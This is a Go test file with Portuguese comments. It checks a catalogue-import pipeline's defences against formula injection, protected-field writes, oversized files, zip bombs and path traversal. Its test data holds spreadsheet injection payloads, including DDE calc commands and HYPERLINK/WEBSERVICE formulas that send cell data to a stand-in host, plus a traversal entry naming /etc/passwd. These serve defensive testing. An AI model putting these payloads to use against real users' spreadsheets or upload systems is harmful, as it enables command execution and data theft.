package ingest

// Testes de segurança do pipeline: arquivo enviado é ENTRADA HOSTIL.

import (
	"archive/zip"
	"bytes"
	"strings"
	"testing"
)

// CSV / Formula Injection (CWE-1236). O estrago não acontece na importação —
// acontece quando alguém exporta o catálogo e abre no Excel.
func TestSanitizeCell_NeutralizaFormula(t *testing.T) {
	ataques := []string{
		`=cmd|'/c calc'!A1`,
		`=1+1`,
		`+cmd|'/c calc'!A1`,
		`-2+3+cmd|'/c calc'!A1`,
		`@SUM(1+9)*cmd|'/c calc'!A1`,
		`=HYPERLINK("http://evil.tld?x="&A1,"clique")`,
		`=WEBSERVICE("http://evil.tld/steal")`,
		"\t=cmd|'/c calc'!A1", // tab à esquerda: o Excel ignora e executa
	}
	for _, a := range ataques {
		got := SanitizeCell(a)
		if got == a {
			t.Errorf("fórmula NÃO neutralizada: %q", a)
		}
		if !strings.HasPrefix(got, "'") {
			t.Errorf("SanitizeCell(%q) = %q — deveria começar com apóstrofo", a, got)
		}
	}
}

func TestSanitizeCell_Idempotente(t *testing.T) {
	// O valor passa pelo staging e pelo mapeamento; aplicar duas vezes não pode
	// acumular apóstrofos e corromper o dado.
	once := SanitizeCell("=1+1")
	twice := SanitizeCell(once)
	if once != twice {
		t.Errorf("não idempotente: %q → %q", once, twice)
	}
}

func TestSanitizeCell_PreservaTextoLegitimo(t *testing.T) {
	// Rejeitar tudo que começa com "-" perderia produto real.
	for _, ok := range []string{"Parafuso 3/8", "Cimento CP-II", "Tinta 18L", "R$ 42,90"} {
		if got := SanitizeCell(ok); got != ok {
			t.Errorf("texto legítimo alterado: %q → %q", ok, got)
		}
	}
}

func TestIsFormula_DistingueValorDeFormula(t *testing.T) {
	formulas := []string{`=cmd|'/c calc'!A1`, `=HYPERLINK("x","y")`, `=SUM(A1:A9)`, `@WEBSERVICE("x")`}
	for _, f := range formulas {
		if !IsFormula(f) {
			t.Errorf("IsFormula(%q) = false, deveria detectar", f)
		}
	}
	// Valores que começam com sinal NÃO são fórmula — marcar como tal encheria
	// a revisão de falso positivo e o operador pararia de olhar.
	valores := []string{"-30%", "+5", "-42,90", "Parafuso"}
	for _, v := range valores {
		if IsFormula(v) {
			t.Errorf("IsFormula(%q) = true, é valor legítimo", v)
		}
	}
}

// A whitelist de campos é a fronteira que impede a importação de virar escrita
// arbitrária em `products`.
func TestProfile_RejeitaCampoForaDaWhitelist(t *testing.T) {
	p := &Profile{
		Name:    "malicioso",
		Columns: map[string]ColumnMapping{"COL": {Field: Field("id")}},
	}
	if err := p.Validate(); err == nil {
		t.Fatal("perfil mapeando 'id' deveria ser rejeitado")
	}

	// Campos que NÃO podem ser escritos por arquivo, cada um por um motivo:
	for _, f := range []string{"id", "created_at", "updated_at", "seller_id", "slug",
		"price_reviewed", "source", "product_id"} {
		p := &Profile{Name: "x", Columns: map[string]ColumnMapping{
			"NOME": {Field: FieldName},
			"COL":  {Field: Field(f)},
		}}
		if err := p.Validate(); err == nil {
			t.Errorf("campo protegido %q foi aceito no perfil", f)
		}
	}
}

func TestColumnFor_SoDevolveColunaDaWhitelist(t *testing.T) {
	// Nenhum campo do domínio pode mapear pra coluna sensível.
	for _, f := range []Field{"id", "slug", "seller_id", "source", "price_reviewed", "created_at"} {
		if col, ok := ColumnFor(f); ok {
			t.Errorf("ColumnFor(%q) devolveu %q — campo protegido não pode ter coluna", f, col)
		}
	}
	// E os campos legítimos continuam funcionando.
	if col, ok := ColumnFor(FieldPrice); !ok || col != "price" {
		t.Errorf("ColumnFor(price) = %q,%v", col, ok)
	}
}

func TestProfile_RejeitaParserDesconhecido(t *testing.T) {
	p := &Profile{Name: "x", Columns: map[string]ColumnMapping{
		"NOME":  {Field: FieldName},
		"PRECO": {Field: FieldPrice, Parser: Parser("mony_br")}, // erro de digitação
	}}
	if err := p.Validate(); err == nil {
		t.Fatal("parser com erro de digitação deveria ser rejeitado — senão vira texto e o preço se perde")
	}
}

func TestProfile_RejeitaCampoDuplicado(t *testing.T) {
	// Duas colunas no mesmo campo tornariam o resultado dependente da ordem de
	// iteração do mapa — não-determinístico entre execuções.
	p := &Profile{Name: "x", Columns: map[string]ColumnMapping{
		"NOME":     {Field: FieldName},
		"PRECO":    {Field: FieldPrice},
		"VLR VENDA": {Field: FieldPrice},
	}}
	if err := p.Validate(); err == nil {
		t.Fatal("campo mapeado por duas colunas deveria ser rejeitado")
	}
}

// --- limites de arquivo -----------------------------------------------------

func TestRead_RejeitaArquivoVazio(t *testing.T) {
	if _, err := Read("x.csv", nil, "", 0); err == nil {
		t.Error("arquivo vazio deveria ser rejeitado")
	}
}

func TestRead_RejeitaArquivoGrandeDemais(t *testing.T) {
	big := make([]byte, MaxFileBytes+1)
	if _, err := Read("x.csv", big, "", 0); err == nil {
		t.Error("arquivo acima do limite deveria ser rejeitado")
	}
}

func TestReadCSV_RejeitaExcessoDeLinhas(t *testing.T) {
	var b strings.Builder
	b.WriteString("sku,name\n")
	for i := 0; i < MaxRows+100; i++ {
		b.WriteString("S,N\n")
	}
	if _, err := Read("x.csv", []byte(b.String()), "", 0); err == nil {
		t.Error("arquivo acima do limite de linhas deveria ser rejeitado")
	}
}

// Zip bomb: um .xlsx é um zip, e um zip de 200 KB pode expandir pra gigabytes.
func TestReadXLSX_RejeitaZipBomb(t *testing.T) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create("xl/worksheets/sheet1.xml")
	if err != nil {
		t.Fatal(err)
	}
	// 40 MB de zeros comprime pra quase nada — razão de compressão altíssima.
	if _, err := w.Write(bytes.Repeat([]byte{0}, 40<<20)); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}

	if _, err := ReadXLSX(buf.Bytes(), ""); err == nil {
		t.Error("zip com razão de compressão suspeita deveria ser rejeitado")
	}
}

func TestReadXLSX_RejeitaArquivoQueNaoEZip(t *testing.T) {
	if _, err := ReadXLSX([]byte("isto não é um zip"), ""); err == nil {
		t.Error("arquivo não-zip deveria ser rejeitado com erro claro")
	}
}

func TestReadXLSX_RejeitaPathTraversal(t *testing.T) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("../../../etc/passwd")
	_, _ = w.Write([]byte("x"))
	_ = zw.Close()

	if _, err := ReadXLSX(buf.Bytes(), ""); err == nil {
		t.Error("zip com path traversal deveria ser rejeitado")
	}
}

// A célula é truncada, não usada pra estourar memória mais adiante.
func TestRead_TruncaCelulaGigante(t *testing.T) {
	huge := strings.Repeat("A", MaxCellBytes*3)
	csv := "sku,name\nS1," + huge + "\n"
	tbl, err := Read("x.csv", []byte(csv), "", 0)
	if err != nil {
		t.Fatal(err)
	}
	for _, row := range tbl.Rows {
		for _, cell := range row {
			if len(cell) > MaxCellBytes {
				t.Errorf("célula de %d bytes não foi truncada", len(cell))
			}
		}
	}
}
